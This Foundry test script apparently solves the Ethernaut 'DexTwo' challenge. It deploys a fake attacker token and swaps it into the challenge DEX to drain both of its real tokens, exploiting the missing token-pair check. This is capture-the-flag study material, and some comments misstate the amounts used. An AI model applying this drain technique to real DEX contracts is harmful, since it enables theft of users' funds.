// SPDX-License-Identifier: UNLICENSED
// forge test -vvvvv --match-path '*23-DexTwoTwo.t.sol'
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/23-DexTwo.sol";
import "../contracts/23-DexTwoFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract DexTwoTest is Test {
    DexTwoFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];
        // log eoa address
        console2.log("eoa:", eoa);

        // Deploy factory to create challenge instance
        factoryContract = new DexTwoFactory();

        // Deploy challenge contract
        challengeAddress = factoryContract.createInstance{value: 1 ether}(address(eoa));
    }

    // function afterRun() public returns (bool) {
    //     return factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
    // }

    function testCheck() public {
        // Get Challenge Instance
        DexTwo challenge = DexTwo(address(challengeAddress));
        // log challenge address
        console2.log("challenge:", address(challenge));
        vm.startPrank(eoa, eoa);

        // Deploy my own attack token contract
        SwappableTokenTwo attackToken = new SwappableTokenTwo(address(challenge), "Token 1", "TKN1", 9999999999999);

        // Get the address of the attack token contract
        address attackTokenAddress = address(attackToken);

        // Transfer 1000 tokens to the challenge contract
        attackToken.transfer(address(challenge), 100);
        // Check balacne of challenge contract
        uint attackBalance = challenge.balanceOf(attackTokenAddress, challengeAddress);
        // get challenge balance of token1
        uint token1Balance = challenge.balanceOf(challenge.token1(), address(challenge));

        // Set the challange contract to have infinite approval for the eoa
        challenge.approve(challengeAddress, type(uint256).max);
        // approve the challenge contract to spend the attack token
        attackToken.approve(address(challenge), type(uint256).max);

        // Swap 100 tokens of attack token for token1
        challenge.swap(attackTokenAddress, challenge.token1(), 100);
        // Check balacne of challenge contract
        attackBalance = challenge.balanceOf(attackTokenAddress, challengeAddress);
        // get challenge balance of token1
        token1Balance = challenge.balanceOf(challenge.token1(), address(challenge));

        // Swap 100 tokens of attack token for token2
        challenge.swap(attackTokenAddress, challenge.token2(), 200);
        // Check balacne of challenge contract
        attackBalance = challenge.balanceOf(attackTokenAddress, challengeAddress);
        // get challenge balance of token2
        token1Balance = challenge.balanceOf(challenge.token2(), address(challenge));

        bool result = factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
        assertEq(result, true, "Challenge should be solved");
    }
}
